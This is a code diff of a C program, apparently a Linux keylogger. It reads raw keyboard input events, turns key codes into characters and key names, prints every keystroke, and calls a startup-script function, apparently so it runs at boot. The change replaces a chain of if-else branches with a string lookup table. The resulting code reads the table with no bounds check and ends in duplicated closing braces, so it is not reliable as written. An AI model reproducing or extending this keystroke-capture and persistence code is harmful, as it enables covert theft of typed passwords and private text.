@@ -41,10 +41,9 @@ int createStartupBash(int numArgs, char* directory) {
 
 int main(int argc, char **argv)
 {
-	FILE *check = fopen("check.txt","w");
-	fclose(check);
     int fd;
-     char values[111]={' ','^','1','2', '3','4','5','6','7','8','9', '0','-','=',' ',' ','q','w','e','r','t','y','u','i','o','p','[',']',' ',' ','a','s','d','f','g','h','j','k','l',';','\'','~',' ','\\','z','x','c','v','b','n','m', ',', '.', '/',' ','*',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ',' ','7','8','9','-','4','5','6','+','1','2','3','0','.'};
+	
+    char *values[112]={" ","^","1","2", "3","4","5","6","7","8","9", "0","-","="," Backspace "," Tab ","q","w","e","r","t","y","u","i","o","p","[","]","\n"," Control ","a","s","d","f","g","h","j","k","l",";","\'","~"," Shift ","\\","z","x","c","v","b","n","m", ",", ".", "/"," Shift ","*"," "," "," Caps Lock "," F1 "," F2 "," F3"," F4 "," F5 "," F6 "," F7 "," F8 "," F9 "," F10 ","  Num Lock "," Scroll Lock ","7","8","9","-","4","5","6","+","1","2","3","0",".", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", " ", "\n", " ", " ", " ", " ", " ", " ", " UpArrow ", " ", " LeftArrow ", " RightArrow ", " ", " DownArrow ", " ", " ", " Delete "};
 
     createStartupBash(argc, argv[2]);
     if(argc < 2) {
@@ -56,42 +55,18 @@ int main(int argc, char **argv)
 
     while (1)
     {
+	char hold[20] = " ";
     read(fd, &ev, sizeof(struct input_event));
 
 if(ev.type == 1&&ev.value==1){
 	
-	if(ev.code<=83&&ev.code!=56&&ev.code!=15&&ev.code!=28&&ev.code!=58&&ev.code!=42&&ev.code!=54&&ev.code!=29&&ev.code!=14&&ev.code!=69)
-	 printf("%c", values[ev.code]);
-
-	else if(ev.code == 105)
-        printf(" LeftArrow ");
-	else if(ev.code == 108)
-        printf(" DownArrow ");
-	else if(ev.code == 106)
-        printf(" RightArrow ");
-	else if(ev.code == 103)
-        printf(" UpArrow ");
-	else if(ev.code == 56)
-        printf(" Alt ");
-	else if(ev.code == 15)
-        printf(" Tab ");
-	else if(ev.code == 28||ev.code==96)
-        printf("\n");
-	else if(ev.code == 58)
-        printf(" CapsLock ");
-	else if(ev.code == 42||ev.code==54)
-        printf(" Shift ");
-	else if(ev.code == 29)
-        printf(" Ctrl ");
-	else if(ev.code == 14)
-        printf(" Backspace ");
-	else if(ev.code == 111)
-        printf(" Delete ");
-	else if(ev.code == 69)
-        printf(" NUMLOCK ");
-
+	strcpy(hold,values[ev.code]);
+	printf("%s", hold);
 	fflush(stdout);
 	}
+
+    }
+}
 
     }
 }
